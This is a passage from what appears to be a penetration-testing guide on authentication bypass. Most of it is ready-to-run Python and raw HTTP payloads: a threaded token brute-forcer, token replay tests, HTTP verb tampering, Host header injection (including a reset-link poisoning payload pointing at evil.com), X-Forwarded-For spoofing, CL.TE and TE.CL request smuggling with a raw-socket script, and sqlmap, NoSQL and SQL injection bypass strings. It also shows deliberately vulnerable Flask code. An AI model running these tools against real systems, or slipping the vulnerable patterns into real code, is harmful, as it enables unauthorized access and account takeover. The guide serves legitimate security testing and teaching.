        )

        if "success" in response2.text.lower():
            print("[+] Token replay successful - token can be reused!")
            return True

        print("[-] Token properly invalidated after use")
        return False

    def test_expired_token(self, old_token):
        """Test if expired tokens are still valid"""
        response = requests.post(
            self.target_url,
            data={"token": old_token, "password": "NewPass!"}
        )

        if "success" in response.text.lower():
            print("[+] Expired token still valid!")
            return True

        print("[-] Expired token properly rejected")
        return False
```

### 3.5 Insufficient Token Entropy

Tokens with insufficient randomness can be brute-forced.

#### Entropy Analysis
```python
import math
from collections import Counter

def calculate_entropy(token):
    """Calculate Shannon entropy of a token"""
    if not token:
        return 0

    # Count character frequencies
    freq = Counter(token)
    length = len(token)

    # Calculate entropy
    entropy = 0
    for count in freq.values():
        probability = count / length
        entropy -= probability * math.log2(probability)

    return entropy

def analyze_token_strength(token):
    """Analyze token security"""
    print(f"Token: {token}")
    print(f"Length: {len(token)}")

    # Character set analysis
    has_lower = any(c.islower() for c in token)
    has_upper = any(c.isupper() for c in token)
    has_digit = any(c.isdigit() for c in token)
    has_special = any(not c.isalnum() for c in token)

    charset_size = 0
    if has_lower:
        charset_size += 26
    if has_upper:
        charset_size += 26
    if has_digit:
        charset_size += 10
    if has_special:
        charset_size += 32  # Approximate

    print(f"Character set size: ~{charset_size}")

    # Calculate keyspace
    keyspace = charset_size ** len(token)
    print(f"Keyspace: {keyspace:.2e}")

    # Entropy
    entropy = calculate_entropy(token)
    print(f"Shannon entropy: {entropy:.2f} bits per character")
    print(f"Total entropy: ~{entropy * len(token):.2f} bits")

    # Brute force estimation (1 billion attempts/second)
    seconds_to_crack = keyspace / 1_000_000_000
    print(f"Time to brute force: {seconds_to_crack:.2e} seconds")

    # Security assessment
    total_bits = entropy * len(token)
    if total_bits < 64:
        print("[!] WEAK: Token has less than 64 bits of entropy")
    elif total_bits < 128:
        print("[*] MODERATE: Token has 64-128 bits of entropy")
    else:
        print("[+] STRONG: Token has 128+ bits of entropy")

# Test tokens
analyze_token_strength("12345")  # Weak
analyze_token_strength("abc123def456")  # Moderate
analyze_token_strength("aB3$kL9#mN2@pQ5")  # Strong
```

#### Token Brute Force Script
```python
import requests
import string
from itertools import product
from concurrent.futures import ThreadPoolExecutor

class TokenBruteForcer:
    def __init__(self, target_url, token_param="token"):
        self.target_url = target_url
        self.token_param = token_param
        self.found = False

    def try_token(self, token):
        if self.found:
            return None

        response = requests.get(
            self.target_url,
            params={self.token_param: token}
        )

        if "invalid" not in response.text.lower() and response.status_code == 200:
            print(f"[+] Valid token: {token}")
            self.found = True
            return token

        return None

    def brute_force_numeric(self, length, threads=10):
        """Brute force numeric tokens"""
        charset = string.digits

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for combo in product(charset, repeat=length):
                if self.found:
                    break
                token = ''.join(combo)
                executor.submit(self.try_token, token)

    def brute_force_sequential(self, start, end, prefix=""):
        """Brute force sequential tokens"""
        for i in range(start, end + 1):
            if self.found:
                break
            token = f"{prefix}{i}"
            self.try_token(token)

# Usage
bruter = TokenBruteForcer("https://target.com/verify")
bruter.brute_force_numeric(4)  # 4-digit numeric token
bruter.brute_force_sequential(1000, 9999, "TOKEN_")
```

---

## 4. Protocol Bypass Techniques

### 4.1 HTTP Verb Tampering

Bypassing access controls by changing HTTP methods.

#### Vulnerable Code Example
```python
# VULNERABLE: Only checks POST method
@app.route('/admin/delete-user', methods=['GET', 'POST', 'PUT', 'DELETE'])
def delete_user():
    if request.method == 'POST':
        # Check authentication
        if not current_user.is_admin:
            return "Unauthorized", 403

    # DELETE action happens regardless of auth check!
    user_id = request.args.get('id')
    User.query.filter_by(id=user_id).delete()
    return "User deleted"
```

#### HTTP Verb Tampering Payloads
```http
# Standard verbs to try
GET /admin/users HTTP/1.1
POST /admin/users HTTP/1.1
PUT /admin/users HTTP/1.1
DELETE /admin/users HTTP/1.1
PATCH /admin/users HTTP/1.1
OPTIONS /admin/users HTTP/1.1
HEAD /admin/users HTTP/1.1

# Non-standard verbs
TRACE /admin/users HTTP/1.1
CONNECT /admin/users HTTP/1.1
PROPFIND /admin/users HTTP/1.1
PROPPATCH /admin/users HTTP/1.1
MKCOL /admin/users HTTP/1.1
COPY /admin/users HTTP/1.1
MOVE /admin/users HTTP/1.1
LOCK /admin/users HTTP/1.1
UNLOCK /admin/users HTTP/1.1

# Custom/arbitrary verbs
CATS /admin/users HTTP/1.1
FOO /admin/users HTTP/1.1
JEFF /admin/users HTTP/1.1

# Method override headers
POST /admin/users HTTP/1.1
X-HTTP-Method: DELETE
X-HTTP-Method-Override: DELETE
X-Method-Override: DELETE
```

#### Verb Tampering Testing Script
```python
import requests

class VerbTamperingTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.methods = [
            'GET', 'POST', 'PUT', 'DELETE', 'PATCH',
            'OPTIONS', 'HEAD', 'TRACE', 'CONNECT',
            'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY',
            'MOVE', 'LOCK', 'UNLOCK', 'ARBITRARY'
        ]

    def test_all_methods(self):
        """Test all HTTP methods"""
        results = {}

        for method in self.methods:
            try:
                response = requests.request(
                    method,
                    self.target_url,
                    timeout=10
                )
                results[method] = {
                    'status': response.status_code,
                    'length': len(response.content)
                }
                print(f"{method}: {response.status_code} ({len(response.content)} bytes)")

            except Exception as e:
                results[method] = {'error': str(e)}
                print(f"{method}: Error - {e}")

        return results

    def test_method_override(self, original_method='POST', target_method='DELETE'):
        """Test method override headers"""
        override_headers = [
            'X-HTTP-Method',
            'X-HTTP-Method-Override',
            'X-Method-Override',
            '_method',
            'X-Requested-With'
        ]

        for header in override_headers:
            response = requests.request(
                original_method,
                self.target_url,
                headers={header: target_method},
                timeout=10
            )

            print(f"{header}: {target_method} -> Status: {response.status_code}")

            if response.status_code != 405 and response.status_code != 403:
                print(f"[+] Method override may work with {header}")

# Usage
tester = VerbTamperingTester("https://target.com/admin/users")
tester.test_all_methods()
tester.test_method_override()
```

### 4.2 Host Header Attacks

Manipulating the Host header to bypass authentication or access controls.

#### Vulnerable Code Example
```python
# VULNERABLE: Trusting Host header for routing/access
@app.route('/admin')
def admin_panel():
    # Check if request is from internal network
    host = request.headers.get('Host', '')

    if 'internal' in host or 'localhost' in host:
        return render_template('admin.html')

    return "Access denied", 403
```

#### Host Header Payloads
```http
# Basic Host header manipulation
GET /admin HTTP/1.1
Host: localhost

GET /admin HTTP/1.1
Host: 127.0.0.1

GET /admin HTTP/1.1
Host: internal.target.com

# Double Host header
GET /admin HTTP/1.1
Host: target.com
Host: localhost

# X-Forwarded-Host
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: localhost

# Host with port
GET /admin HTTP/1.1
Host: localhost:80

GET /admin HTTP/1.1
Host: localhost:443

# Host header with @ for URL confusion
GET /admin HTTP/1.1
Host: target.com@localhost

# Absolute URL with different Host
GET http://localhost/admin HTTP/1.1
Host: target.com

# Host header injection for password reset
POST /forgot-password HTTP/1.1
Host: evil.com
# Reset link will be sent to: http://evil.com/reset?token=xxx
```

#### Host Header Testing Script
```python
import requests

class HostHeaderTester:
    def __init__(self, base_url, target_path="/admin"):
        self.base_url = base_url
        self.target_path = target_path

    def test_host_manipulation(self):
        """Test various Host header manipulations"""
        payloads = [
            'localhost',
            '127.0.0.1',
            'internal',
            'internal.company.com',
            '10.0.0.1',
            '192.168.1.1',
            'localhost:80',
            'localhost:443',
            '[::1]',  # IPv6 localhost
        ]

        for payload in payloads:
            try:
                # Use actual target IP but manipulate Host header
                response = requests.get(
                    f"{self.base_url}{self.target_path}",
                    headers={'Host': payload},
                    allow_redirects=False,
                    timeout=10
                )

                print(f"Host: {payload} -> {response.status_code}")

                if response.status_code == 200:
                    print(f"[+] Access granted with Host: {payload}")

            except Exception as e:
                print(f"Host: {payload} -> Error: {e}")

    def test_forwarded_headers(self):
        """Test X-Forwarded-* headers"""
        headers_to_test = {
            'X-Forwarded-Host': ['localhost', 'internal', '127.0.0.1'],
            'X-Forwarded-For': ['127.0.0.1', '10.0.0.1', '192.168.1.1'],
            'X-Host': ['localhost', 'internal'],
            'X-Original-URL': ['/admin'],
            'X-Rewrite-URL': ['/admin'],
        }

        for header, values in headers_to_test.items():
            for value in values:
                response = requests.get(
                    f"{self.base_url}{self.target_path}",
                    headers={header: value},
                    allow_redirects=False,
                    timeout=10
                )

                print(f"{header}: {value} -> {response.status_code}")

                if response.status_code == 200:
                    print(f"[+] Access granted with {header}: {value}")

# Usage
tester = HostHeaderTester("https://target.com")
tester.test_host_manipulation()
tester.test_forwarded_headers()
```

### 4.3 X-Forwarded-For Manipulation

Spoofing client IP address to bypass IP-based restrictions.

#### Vulnerable Code Example
```python
# VULNERABLE: Trusting X-Forwarded-For header
def get_client_ip():
    # Trusts proxy header without validation
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr

@app.route('/admin')
def admin():
    client_ip = get_client_ip()

    # IP whitelist check
    allowed_ips = ['10.0.0.0/8', '192.168.0.0/16', '127.0.0.1']

    if is_ip_allowed(client_ip, allowed_ips):
        return render_template('admin.html')

    return "Access denied", 403
```

#### X-Forwarded-For Payloads
```http
# Single IP spoof
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 192.168.1.1
X-Forwarded-For: 172.16.0.1

# Multiple IPs (some apps take first, some take last)
X-Forwarded-For: 127.0.0.1, 8.8.8.8
X-Forwarded-For: 8.8.8.8, 127.0.0.1

# Alternative headers
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
Forwarded-For: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Fastly-Client-IP: 127.0.0.1

# IPv6 localhost
X-Forwarded-For: ::1
X-Forwarded-For: 0:0:0:0:0:0:0:1

# Special values
X-Forwarded-For: localhost
X-Forwarded-For: unknown
```

#### IP Bypass Testing Script
```python
import requests

class IPBypassTester:
    def __init__(self, target_url):
        self.target_url = target_url
        self.ip_headers = [
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Client-IP',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'X-Cluster-Client-IP',
            'True-Client-IP',
            'Forwarded-For',
            'CF-Connecting-IP',
            'Fastly-Client-IP',
        ]

        self.ip_values = [
            '127.0.0.1',
            'localhost',
            '10.0.0.1',
            '10.10.10.10',
            '192.168.0.1',
            '192.168.1.1',
            '172.16.0.1',
            '::1',
            '0.0.0.0',
            '255.255.255.255',
        ]

    def test_all_combinations(self):
        """Test all header/IP combinations"""
        results = []

        for header in self.ip_headers:
            for ip in self.ip_values:
                try:
                    response = requests.get(
                        self.target_url,
                        headers={header: ip},
                        timeout=10,
                        allow_redirects=False
                    )

                    if response.status_code == 200:
                        print(f"[+] Access with {header}: {ip}")
                        results.append((header, ip))

                except Exception as e:
                    pass

        return results

    def test_chained_headers(self):
        """Test multiple headers simultaneously"""
        internal_headers = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
        }

        response = requests.get(
            self.target_url,
            headers=internal_headers,
            timeout=10,
            allow_redirects=False
        )

        print(f"All headers: Status {response.status_code}")
        return response.status_code == 200

# Usage
tester = IPBypassTester("https://target.com/admin")
tester.test_all_combinations()
tester.test_chained_headers()
```

### 4.4 HTTP Request Smuggling

Exploiting differences in how frontend and backend servers parse HTTP requests.

#### Request Smuggling Basics
```http
# CL.TE (Content-Length vs Transfer-Encoding)
# Frontend uses Content-Length, Backend uses Transfer-Encoding

POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

GPOST / HTTP/1.1
Host: target.com

# TE.CL (Transfer-Encoding vs Content-Length)
# Frontend uses Transfer-Encoding, Backend uses Content-Length

POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
GPOST /
0

# TE.TE (Obfuscated Transfer-Encoding)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-encoding: x

0

GPOST / HTTP/1.1
Host: target.com
```

#### Smuggling for Auth Bypass
```http
# Smuggle request to access admin panel
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
Content-Length: 10

x=

# Smuggle request with internal headers
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

POST /admin/delete-user HTTP/1.1
Host: localhost
Cookie: admin_session=xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

user_id=1
```

#### Request Smuggling Testing Script
```python
import socket
import ssl

class RequestSmugglingTester:
    def __init__(self, host, port=443, use_ssl=True):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl

    def send_raw(self, data):
        """Send raw HTTP request"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        if self.use_ssl:
            context = ssl.create_default_context()
            sock = context.wrap_socket(sock, server_hostname=self.host)

        sock.connect((self.host, self.port))
        sock.send(data.encode())

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break

        sock.close()
        return response.decode('utf-8', errors='ignore')

    def test_cl_te(self):
        """Test CL.TE vulnerability"""
        # Time delay technique
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"A\r\n"
            f"X"  # Incomplete - should cause timeout
        )

        import time
        start = time.time()
        try:
            self.send_raw(payload)
        except:
            pass
        elapsed = time.time() - start

        if elapsed > 5:
            print("[+] Possible CL.TE vulnerability (request caused delay)")
            return True

        print("[-] CL.TE not detected")
        return False

    def test_te_cl(self):
        """Test TE.CL vulnerability"""
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # Extra data
        )

        response = self.send_raw(payload)

        if "400" in response or "error" in response.lower():
            print("[+] Possible TE.CL vulnerability")
            return True

        print("[-] TE.CL not detected")
        return False

    def smuggle_admin_request(self):
        """Attempt to smuggle admin request"""
        smuggled_request = (
            f"GET /admin HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"X-Forwarded-For: 127.0.0.1\r\n"
            f"\r\n"
        )

        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Length: {len(smuggled_request) + 5}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_request}"
        )

        response = self.send_raw(payload)
        return response

# Usage
tester = RequestSmugglingTester("target.com")
tester.test_cl_te()
tester.test_te_cl()
```

---

## 5. Testing Tools Summary

### SQL Injection
```bash
# sqlmap
sqlmap -u "http://target/login" --data="user=a&pass=b" --level=5 --risk=3 --dump

# Manual testing with curl
curl -X POST http://target/login -d "username=admin'--&password=x"
```

### NoSQL Injection
```bash
# Using curl with JSON
curl -X POST http://target/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

### Burp Suite Extensions
```
- Auth Analyzer - Automatic authentication testing
- Autorize - Authorization enforcement testing
- SQLiPy - SQL injection testing
- JWT Editor - JWT manipulation
- SAML Raider - SAML testing
```

### Custom wordlists
```bash
# Generate username list
seq 1 1000 | while read i; do echo "user$i"; done > users.txt

# Authentication bypass payloads
cat > auth_bypass.txt << 'EOF'
' OR '1'='1
" OR "1"="1
admin'--
') OR ('1'='1
EOF
```

---

## References

- OWASP Testing Guide: Authentication Testing
- OWASP Authentication Cheat Sheet
- CWE-287: Improper Authentication
- CWE-89: SQL Injection
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic
- CWE-639: Authorization Bypass Through User-Controlled Key
- PortSwigger Web Security Academy: Authentication
- PayloadsAllTheThings: Authentication Bypass
